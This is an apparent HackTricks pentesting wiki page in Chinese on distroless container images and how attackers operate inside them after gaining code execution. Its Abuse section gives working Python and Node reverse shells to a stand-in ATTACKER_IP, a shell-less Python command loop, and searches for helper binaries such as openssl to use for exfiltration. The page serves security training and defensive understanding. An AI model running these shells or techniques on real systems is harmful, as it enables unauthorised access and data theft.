# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**distroless** container image 是一种仅包含**运行某个特定应用所需的最小 runtime 组件**的镜像，同时会有意移除通常的发行版工具，例如 package manager、shell 以及大量通用 userland 工具。实际上，distroless 镜像通常只包含应用 binary 或 runtime、共享库、证书 bundle，以及非常精简的文件系统布局。

重点并不是 distroless 是一种新的 kernel isolation primitive。Distroless 是一种**镜像设计策略**。它改变的是容器文件系统**内部可用的内容**，而不是 kernel 如何隔离容器。这一区别很重要，因为 distroless 主要通过减少攻击者在获得 code execution 后可使用的资源来强化环境。它无法替代 namespaces、seccomp、capabilities、AppArmor、SELinux 或其他 runtime isolation 机制。

## Why Distroless Exists

Distroless 镜像主要用于减少：

- 镜像大小
- 镜像的运维复杂性
- 可能包含漏洞的 package 和 binary 数量
- 默认情况下攻击者可用的 post-exploitation 工具数量

这就是 distroless 镜像在生产应用部署中很受欢迎的原因。一个不包含 shell、package manager，且几乎没有通用工具的容器，通常更容易进行运维分析，并且在 compromise 后更难被交互式滥用。

知名的 distroless 风格镜像系列包括：

- Google's distroless images
- Chainguard hardened/minimal images

## What Distroless Does Not Mean

一个 distroless 容器**并不意味着**：

- 自动以 rootless 方式运行
- 自动处于 non-privileged 状态
- 自动为 read-only
- 自动受到 seccomp、AppArmor 或 SELinux 保护
- 自动免受 container escape 影响

仍然可以通过 `--privileged`、共享 host namespace、危险的 bind mounts 或挂载 runtime socket 来运行 distroless 镜像。在这种情况下，镜像可能很精简，但容器仍然可能存在灾难性的安全风险。Distroless 改变的是 **userland attack surface**，而不是 **kernel trust boundary**。

## Typical Operational Characteristics

当你 compromise 一个 distroless 容器时，通常最先注意到的是：许多常见假设不再成立。容器中可能没有 `sh`、没有 `bash`、没有 `ls`、没有 `id`、没有 `cat`，有时甚至没有一个行为符合你常用 tradecraft 预期的基于 libc 的环境。这会同时影响 offense 和 defense，因为缺少工具会使 debugging、incident response 和 post-exploitation 变得不同。

最常见的情况包括：

- 存在 application runtime，但除此之外几乎什么都没有
- 由于没有 shell，基于 shell 的 payload 会失败
- 由于缺少辅助 binary，常见的 enumeration one-liner 会失败
- 文件系统保护措施也经常存在，例如 read-only rootfs，或在可写的 tmpfs 位置上设置 `noexec`

这种组合通常就是人们讨论“weaponizing distroless”的原因。

## Distroless And Post-Exploitation

在 distroless 环境中，主要的 offensive challenge 并不总是初始的 RCE。通常更棘手的是接下来会发生什么。如果被 exploit 的 workload 在 Python、Node.js、Java 或 Go 等 language runtime 中提供 code execution，你可能能够执行任意逻辑，但无法使用其他 Linux target 中常见的、以 shell 为中心的标准 workflow。

这意味着 post-exploitation 通常会转向以下三个方向之一：

1. **直接使用现有的 language runtime** 来枚举环境、打开 sockets、读取文件，或 staging 额外的 payload。
2. 如果文件系统是 read-only，或可写位置被挂载为 `noexec`，则**将自带的 tooling 加载到内存中**。
3. 如果 application 或其 dependencies 中包含某些意外有用的内容，则**滥用镜像中已经存在的 binary**。

## Abuse

### Enumerate The Runtime You Already Have

许多 distroless 容器中没有 shell，但仍然存在 application runtime。如果 target 是 Python service，那么 Python 就在其中。如果 target 是 Node.js，那么 Node 就在其中。这通常已经提供了足够的功能，可以枚举文件、读取环境变量、打开 reverse shell，并在完全不调用 `/bin/sh` 的情况下执行 in-memory staging。

下面是一个使用 Python 的简单示例：
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
一个使用 Node.js 的简单示例：
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- 恢复环境变量，其中通常包括 credentials 或 service endpoints
- 在没有 `/bin/ls` 的情况下枚举 filesystem
- 识别可写路径和已挂载的 secrets

### Reverse Shell Without `/bin/sh`

如果 image 中不包含 `sh` 或 `bash`，基于 shell 的经典 Reverse Shell 可能会立即失败。在这种情况下，改用已安装的 language runtime。

Python Reverse Shell：
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
如果 `/bin/sh` 不存在，请将最后一行替换为由 Python 直接驱动的命令执行，或使用 Python REPL 循环。

Node reverse shell：
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
再次强调，如果不存在 `/bin/sh`，请直接使用 Node 的 filesystem、process 和 networking APIs，而不是 spawn shell。

### Full Example: No-Shell Python Command Loop

如果 image 中有 Python，但完全没有 shell，一个简单的 interactive loop 通常就足以保留完整的 post-exploitation capability：
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
这不需要交互式 shell binary。从攻击者的角度来看，其影响实际上与基本 shell 相同：命令执行、枚举，以及通过现有 runtime 部署更多 payload。

### 内存中执行工具

Distroless images 通常会与以下配置结合使用：

- `readOnlyRootFilesystem: true`
- 可写但启用 `noexec` 的 tmpfs，例如 `/dev/shm`
- 缺少 package management tools

这种组合会使经典的“将 binary 下载到磁盘并运行”工作流变得不可靠。在这些情况下，内存执行技术就成为主要方案。

对应的专门页面是：

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

其中最相关的技术包括：

- 通过 scripting runtimes 使用 `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Image 中已有的 Binaries

一些 Distroless images 仍然包含运行所必需的 binaries，而这些 binaries 在 compromise 后会变得有用。一个经常被观察到的例子是 `openssl`，因为应用有时需要它来执行 crypto 或 TLS 相关任务。

一个快速的搜索模式是：
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
如果存在 `openssl`，它可能可用于：

- outbound TLS connections
- 通过允许的 egress channel 进行 data exfiltration
- 通过 encoded/encrypted blobs 暂存 payload data

具体的 abuse 取决于实际安装的内容，但总体思路是：distroless 并不意味着“完全没有任何工具”；它意味着“可用工具远少于普通 distribution image”。

## Checks

这些 checks 的目标是确定该 image 在实际环境中是否确实为 distroless，以及在 post-exploitation 阶段仍有哪些 runtime 或 helper binaries 可用。
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
这里有哪些值得关注的内容：

- 如果不存在 shell，但存在 Python 或 Node 等 runtime，post-exploitation 应转向由 runtime 驱动的执行。
- 如果 root filesystem 为只读，而 `/dev/shm` 可写但设置了 `noexec`，memory execution techniques 就会变得更加重要。
- 如果存在 `openssl`、`busybox` 或 `java` 等辅助 binary，它们可能提供足够的功能来 bootstrap 更进一步的访问。

## Runtime 默认配置

| Image / platform 风格 | 默认状态 | 典型行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Google distroless 风格 images | 设计上采用最小化 userland | 没有 shell、没有 package manager，只有 application/runtime dependencies | 添加 debugging layers、sidecar shells，或复制入 busybox 及其他 tooling |
| Chainguard minimal images | 设计上采用最小化 userland | 减少 package surface，通常专注于单个 runtime 或 service | 使用 `:latest-dev` 或 debug variants，在 build 期间复制入 tools |
| 使用 distroless images 的 Kubernetes workloads | 取决于 Pod config | Distroless 只影响 userland；Pod security posture 仍取决于 Pod spec 和 runtime defaults | 添加 ephemeral debug containers、host mounts、privileged Pod settings |
| 运行 distroless images 的 Docker / Podman | 取决于 run flags | Filesystem 最小化，但 runtime security 仍取决于 flags 和 daemon configuration | `--privileged`、host namespace sharing、runtime socket mounts、writable host binds |

关键点在于，distroless 是一个 **image 属性**，而不是 runtime protection。它的价值在于减少 compromise 后 filesystem 内可用的内容。

## 相关页面

关于 distroless environments 中通常需要的 filesystem 和 memory-execution bypasses：

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

关于仍适用于 distroless workloads 的 container runtime、socket 和 mount abuse：

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
